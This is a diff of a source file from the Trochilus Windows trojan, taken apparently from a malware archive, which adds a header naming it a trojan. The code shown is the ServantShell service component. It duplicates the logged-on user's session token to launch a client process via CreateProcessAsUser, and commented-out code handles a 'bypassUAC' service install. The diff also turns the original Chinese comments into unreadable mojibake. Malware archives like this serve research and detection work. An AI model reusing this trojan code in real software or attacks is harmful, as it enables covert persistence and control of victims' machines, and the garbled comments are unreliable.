@@ -1,4 +1,15 @@
-// servantshell.cpp : ¶¨Òå DLL Ó¦ÓÃ³ÌÐòµÄµ¼³öº¯Êý¡£
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
+// servantshell.cpp : ï¿½ï¿½ï¿½ï¿½ DLL Ó¦ï¿½Ã³ï¿½ï¿½ï¿½Äµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 //
 
 #include "stdafx.h"
@@ -42,28 +53,28 @@ static BOOL SetStatus( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
 
 void CreateUserProcess()
 {
-	// ÎªÁËÏÔÊ¾¸ü¼Ó¸´ÔÓµÄÓÃ»§½çÃæ£¬ÎÒÃÇÐèÒª´ÓSession 0´´½¨
-	// Ò»¸ö½ø³Ì£¬µ«ÊÇÕâ¸ö½ø³ÌÊÇÔËÐÐÔÚÓÃ»§»·¾³ÏÂ¡£
-	// ÎÒÃÇ¿ÉÒÔÊ¹ÓÃCreateProcessAsUserÊµÏÖÕâÒ»¹¦ÄÜ¡£
+	// Îªï¿½ï¿½ï¿½ï¿½Ê¾ï¿½ï¿½ï¿½Ó¸ï¿½ï¿½Óµï¿½ï¿½Ã»ï¿½ï¿½ï¿½ï¿½æ£¬ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Òªï¿½ï¿½Session 0ï¿½ï¿½ï¿½ï¿½
+	// Ò»ï¿½ï¿½ï¿½ï¿½ï¿½Ì£ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ã»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Â¡ï¿½
+	// ï¿½ï¿½ï¿½Ç¿ï¿½ï¿½ï¿½Ê¹ï¿½ï¿½CreateProcessAsUserÊµï¿½ï¿½ï¿½ï¿½Ò»ï¿½ï¿½ï¿½Ü¡ï¿½
 
 	BOOL bSuccess = FALSE;
 	STARTUPINFO si = {0};
-	// ½ø³ÌÐÅÏ¢
+	// ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢
 	PROCESS_INFORMATION pi = {0};
 	si.cb = sizeof(si);
 
-	// »ñµÃµ±Ç°Session ID
+	// ï¿½ï¿½Ãµï¿½Ç°Session ID
 	DWORD dwSessionID = WTSGetActiveConsoleSessionId();
 
 	HANDLE hToken = NULL;
-	// »ñµÃµ±Ç°SessionµÄÓÃ»§ÁîÅÆ
+	// ï¿½ï¿½Ãµï¿½Ç°Sessionï¿½ï¿½ï¿½Ã»ï¿½ï¿½ï¿½ï¿½ï¿½
 	if (WTSQueryUserToken(dwSessionID, &hToken) == FALSE)
 	{
 		int nError = GetLastError();
 		goto Cleanup;
 	}
 
-	// ¸´ÖÆÁîÅÆ
+	// ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 	HANDLE hDuplicatedToken = NULL;
 	if (DuplicateTokenEx(hToken,
 		MAXIMUM_ALLOWED, NULL,
@@ -73,7 +84,7 @@ void CreateUserProcess()
 		goto Cleanup;
 	}
 
-	// ´´½¨ÓÃ»§Session»·¾³
+	// ï¿½ï¿½ï¿½ï¿½ï¿½Ã»ï¿½Sessionï¿½ï¿½ï¿½ï¿½
 	LPVOID lpEnvironment = NULL;
 	if (CreateEnvironmentBlock(&lpEnvironment,
 		hDuplicatedToken, FALSE) == FALSE)
@@ -81,7 +92,7 @@ void CreateUserProcess()
 		goto Cleanup;
 	}
 
-	// »ñµÃ¸´ÔÓ½çÃæµÄÃû×Ö£¬Ò²¾ÍÊÇ»ñµÃ¿ÉÖ´ÐÐÎÄ¼þµÄÂ·¾¶
+	// ï¿½ï¿½Ã¸ï¿½ï¿½Ó½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö£ï¿½Ò²ï¿½ï¿½ï¿½Ç»ï¿½Ã¿ï¿½Ö´ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½Â·ï¿½ï¿½
 	TCHAR lpszClientPath[MAX_PATH*2];
 	TCHAR lpszModulePath[MAX_PATH];
 	TCHAR lpszSysPath[MAX_PATH];
@@ -92,8 +103,8 @@ void CreateUserProcess()
 
 	debugLog(lpszClientPath);
 
-	// ÔÚ¸´ÖÆµÄÓÃ»§SessionÏÂÖ´ÐÐÓ¦ÓÃ³ÌÐò£¬´´½¨½ø³Ì¡£
-	// Í¨¹ýÕâ¸ö½ø³Ì£¬¾Í¿ÉÒÔÏÔÊ¾¸÷ÖÖ¸´ÔÓµÄÓÃ»§½çÃæÁË
+	// ï¿½Ú¸ï¿½ï¿½Æµï¿½ï¿½Ã»ï¿½Sessionï¿½ï¿½Ö´ï¿½ï¿½Ó¦ï¿½Ã³ï¿½ï¿½ò£¬´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ì¡ï¿½
+	// Í¨ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ì£ï¿½ï¿½Í¿ï¿½ï¿½ï¿½ï¿½ï¿½Ê¾ï¿½ï¿½ï¿½Ö¸ï¿½ï¿½Óµï¿½ï¿½Ã»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 	if (CreateProcessAsUser(hDuplicatedToken, 
 		NULL, lpszClientPath, NULL, NULL, FALSE,                    
 		NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
@@ -106,7 +117,7 @@ void CreateUserProcess()
 	CloseHandle(pi.hThread);
 	bSuccess = TRUE;
 
-	// ÇåÀí¹¤×÷
+	// ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 Cleanup:
 	if (hToken != NULL)
@@ -178,7 +189,7 @@ void WINAPI Main(
 // 	GetModuleFileName(NULL, filepath, MAX_PATH);
 // 	debugLog(_T("CheckBypassUAC filepath : [%s]"), filepath);
 // 
-// 	//¼ì²éµ±Ç°exeÃû³ÆÊÇ·ñrundll32.exe£¬Èç¹û²»ÊÇ£¬ÔòËµÃ÷²»ÊÇbypassUAC°æ±¾£¬ÔòÖ±½Ó·µ»Ø
+// 	//ï¿½ï¿½éµ±Ç°exeï¿½ï¿½ï¿½ï¿½ï¿½Ç·ï¿½rundll32.exeï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ç£ï¿½ï¿½ï¿½Ëµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½bypassUACï¿½æ±¾ï¿½ï¿½ï¿½ï¿½Ö±ï¿½Ó·ï¿½ï¿½ï¿½
 // 	tstring filename = filepath;
 // 	tstring::size_type pos = filename.find_last_of('\\');
 // 	if (pos != tstring::npos) filename = filename.substr(pos + 1);
@@ -188,7 +199,7 @@ void WINAPI Main(
 // 		return;
 // 	}
 // 
-// 	//ÊÇbypassUAC°æ±¾£¬µ÷ÓÃ°²×°³ÌÐò
+// 	//ï¿½ï¿½bypassUACï¿½æ±¾ï¿½ï¿½ï¿½ï¿½ï¿½Ã°ï¿½×°ï¿½ï¿½ï¿½ï¿½
 // 	debugLog(_T("Install ServantShell service"));
 // 	g_ServiceInfo.bUseChameleon = FALSE;
 // 	InstallService();
